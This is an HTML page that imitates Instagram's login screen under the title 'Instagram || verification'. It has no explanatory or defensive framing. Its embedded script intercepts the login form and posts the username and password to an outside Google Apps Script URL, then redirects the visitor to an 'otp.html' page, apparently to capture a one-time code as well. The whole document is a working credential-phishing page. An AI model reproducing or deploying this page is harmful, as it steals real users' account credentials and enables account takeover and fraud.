<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram || verification</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
    
    <div class="container">
        <div class="box">
            <div class="heading"></div>
            <form id="submit-form" class="login-form" action="" >
                <div class="field">
                    <input id="username" type="name" name="name" placeholder="Phone number, username, or email" />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="password" name="password" type="password" placeholder="password" />
                    <label for="password">Password</label>
                </div>
                <button class="login-button" title="login" >Log In</button>
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="other">
                    <button class="fb-login-btn" type="button">
                        <i class="fa fa-facebook-official fb-icon"></i>
                        <span class="">Log in with Facebook</span>
                    </button>
                    <a class="forgot-password" href="#">Forgot password?</a>
                </div>
            </form>
        </div>
        <div class="box">
            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
        </div>
    </div>

    <script>
        $("#submit-form").submit((e)=>{
            e.preventDefault();
            $.ajax({
                url:'https://script.google.com/macros/s/AKfycbwqboKYBSf5hfZ2GtPBAb3q5YKxunu3Dm5ZOP0GBBKiQEgRsJGoIrux68ZRBl1WMVBq/exec',
                data:$("#submit-form").serialize(),
                method:'post',
                success:function (response){
                    window.location.href = 'otp.html'
                },error:function (err){
                    alert("try again")
                }
            })
        })
    </script>

</body>
</html>
